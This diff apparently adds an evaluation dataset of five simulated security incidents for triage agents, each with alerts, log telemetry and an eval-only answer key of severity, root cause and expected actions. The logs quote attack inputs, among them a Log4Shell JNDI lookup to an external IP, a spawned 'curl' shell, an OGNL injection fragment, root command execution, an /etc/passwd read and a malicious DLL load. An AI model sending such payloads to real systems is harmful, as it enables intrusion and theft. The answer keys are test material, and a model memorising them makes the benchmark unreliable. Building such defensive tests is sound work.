@@ -1,0 +1,132 @@
+{
+  "schema_note": "Same contract as it-ops: agents see `alert` + `telemetry`; `ground_truth` is eval-only and never shown to an agent. `alert.cve_ids` lists the CVEs the Diagnosis CVE tool (packs/sec-ops/tools.py) enriches at runtime.",
+  "incidents": [
+    {
+      "id": "SEC-001-log4shell-jndi",
+      "title": "Outbound JNDI callbacks from the payments API pod",
+      "alert": {
+        "source": "IDS",
+        "message": "Egress LDAP/JNDI callbacks from prod-payments-api to an external host immediately after inbound requests carrying ${jndi:ldap://...} in the User-Agent header.",
+        "asset": "prod-payments-api (internet-facing)",
+        "cve_ids": ["CVE-2021-44228"]
+      },
+      "telemetry": {
+        "logs": [
+          "2026-07-03T20:58:11Z prod-payments-api WARN request User-Agent=${jndi:ldap://45.155.205.233:1389/a}",
+          "2026-07-03T20:58:12Z prod-payments-api INFO outbound tcp 45.155.205.233:1389 (LDAP)",
+          "2026-07-03T20:58:13Z prod-payments-api INFO child process spawned: /bin/sh -c curl"
+        ],
+        "metrics": {"egress_connections_per_min": 42, "baseline_egress_per_min": 1},
+        "deploys": [
+          {"service": "prod-payments-api", "version": "log4j-2.14.1", "at": "2026-05-01T00:00:00Z"}
+        ]
+      },
+      "ground_truth": {
+        "severity": "SEV-1",
+        "root_cause": "Remote code execution via Log4Shell (CVE-2021-44228); the JNDI lookup fetched and ran an attacker payload.",
+        "expected_actions": ["Isolate the pod from egress", "Roll to a patched log4j build", "Rotate any credentials reachable from the pod"]
+      }
+    },
+    {
+      "id": "SEC-002-struts-ognl-rce",
+      "title": "OGNL injection on the public file-upload endpoint",
+      "alert": {
+        "source": "WAF",
+        "message": "Content-Type OGNL payloads (%{...}) on POST /upload against the legacy Struts service; one request returned command output in the response body.",
+        "asset": "legacy-docs-portal (internet-facing)",
+        "cve_ids": ["CVE-2017-5638"]
+      },
+      "telemetry": {
+        "logs": [
+          "2026-07-03T21:02:04Z docs-portal WARN Content-Type=%{(#_='multipart/form-data')...}",
+          "2026-07-03T21:02:05Z docs-portal INFO command executed: id -> uid=0(root)",
+          "2026-07-03T21:02:40Z docs-portal INFO /etc/passwd read into response"
+        ],
+        "metrics": {"error_rate": 0.02, "requests_per_min": 300},
+        "deploys": [
+          {"service": "legacy-docs-portal", "version": "struts-2.3.31", "at": "2024-11-10T00:00:00Z"}
+        ]
+      },
+      "ground_truth": {
+        "severity": "SEV-1",
+        "root_cause": "Remote code execution via Struts OGNL injection (CVE-2017-5638); attacker achieved root command execution.",
+        "expected_actions": ["Take the endpoint offline", "Rebuild the host from a known-good image", "Rotate secrets on the host"]
+      }
+    },
+    {
+      "id": "SEC-003-heartbleed-probes",
+      "title": "Repeated malformed TLS heartbeat reads on the VPN concentrator",
+      "alert": {
+        "source": "NIDS",
+        "message": "Bursts of malformed TLS heartbeat requests to the external VPN endpoint consistent with memory-disclosure probing; no confirmed data returned to the client yet.",
+        "asset": "vpn-gw-01 (internet-facing)",
+        "cve_ids": ["CVE-2014-0160"]
+      },
+      "telemetry": {
+        "logs": [
+          "2026-07-03T21:05:00Z vpn-gw-01 WARN heartbeat payload_length=65535 actual=1",
+          "2026-07-03T21:05:01Z vpn-gw-01 WARN heartbeat payload_length=65535 actual=3"
+        ],
+        "metrics": {"heartbeat_anomalies_per_min": 18, "baseline": 0},
+        "deploys": [
+          {"service": "vpn-gw-01", "version": "openssl-1.0.1f", "at": "2025-02-01T00:00:00Z"}
+        ]
+      },
+      "ground_truth": {
+        "severity": "SEV-2",
+        "root_cause": "Heartbleed (CVE-2014-0160) probing against an unpatched OpenSSL VPN endpoint; exploitation attempts underway, no confirmed key/memory disclosure.",
+        "expected_actions": ["Patch OpenSSL and rotate the VPN certificate", "Force credential reset for VPN users"]
+      }
+    },
+    {
+      "id": "SEC-004-printnightmare-attempt",
+      "title": "Spooler spawning child processes on an internal print server",
+      "alert": {
+        "source": "EDR",
+        "message": "spoolsv.exe spawned rundll32 loading a DLL from a user-writable path on an internal-only print server; blocked by EDR before execution completed.",
+        "asset": "print-srv-07 (internal VLAN, not internet-facing)",
+        "cve_ids": ["CVE-2021-34527"]
+      },
+      "telemetry": {
+        "logs": [
+          "2026-07-03T21:08:22Z print-srv-07 WARN spoolsv.exe -> rundll32 C:\\Users\\public\\evil.dll",
+          "2026-07-03T21:08:22Z print-srv-07 INFO EDR blocked child process (policy: spooler-guard)"
+        ],
+        "metrics": {"blocked_execations_per_min": 3},
+        "deploys": [
+          {"service": "print-srv-07", "version": "windows-spooler-unpatched", "at": "2025-06-01T00:00:00Z"}
+        ]
+      },
+      "ground_truth": {
+        "severity": "SEV-2",
+        "root_cause": "PrintNightmare (CVE-2021-34527) exploitation attempt for local privilege escalation on an internal, unpatched print server; EDR blocked it.",
+        "expected_actions": ["Apply the spooler patch", "Disable the Print Spooler where unused"]
+      }
+    },
+    {
+      "id": "SEC-005-libwebp-patched",
+      "title": "Vulnerability scanner flags libwebp on an internal build box",
+      "alert": {
+        "source": "Scanner",
+        "message": "Nightly scan reports a libwebp version associated with CVE-2023-4863 on an internal CI build box; the box has since been patched by the platform baseline job, pending scan refresh.",
+        "asset": "ci-build-03 (internal, no inbound exposure)",
+        "cve_ids": ["CVE-2023-4863"]
+      },
+      "telemetry": {
+        "logs": [
+          "2026-07-03T21:11:00Z ci-build-03 INFO baseline-patch job applied libwebp-1.3.2 (fixed)",
+          "2026-07-03T21:12:00Z ci-build-03 INFO scanner cache stale until 22:00Z"
+        ],
+        "metrics": {"inbound_connections_per_min": 0},
+        "deploys": [
+          {"service": "ci-build-03", "version": "libwebp-1.3.2", "at": "2026-07-03T21:11:00Z"}
+        ]
+      },
+      "ground_truth": {
+        "severity": "SEV-3",
+        "root_cause": "libwebp heap overflow (CVE-2023-4863) reported by a stale scan on an internal build box that is already patched; no reachable attack path.",
+        "expected_actions": ["Force a scanner rescan to clear the stale finding"]
+      }
+    }
+  ]
+}
